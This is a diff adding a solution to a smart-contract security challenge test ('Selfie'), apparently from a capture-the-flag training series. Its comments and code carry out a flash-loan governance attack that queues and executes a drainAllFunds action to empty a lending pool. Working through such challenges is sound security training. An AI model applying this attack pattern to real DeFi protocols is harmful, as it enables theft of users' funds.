@@ -31,6 +31,20 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Execute flashloan and borrow all the DVT tokens in the pool
+        // Call queueAction() in governance and pass in the proposal to drainAllFunds()
+        // Fast forward 2 days in the timestamp
+        // Call executeAction() method in governance
+        const AttackerFactory = await ethers.getContractFactory("SelfieAttacker", attacker);
+        const attackerContract = await AttackerFactory.deploy(
+            this.governance.address, 
+            this.token.address, 
+            this.pool.address
+        )
+        await attackerContract.connect(attacker).startExploit(TOKENS_IN_POOL);
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        await attackerContract.connect(attacker).withdrawAssets();
     });
 
     after(async function () {
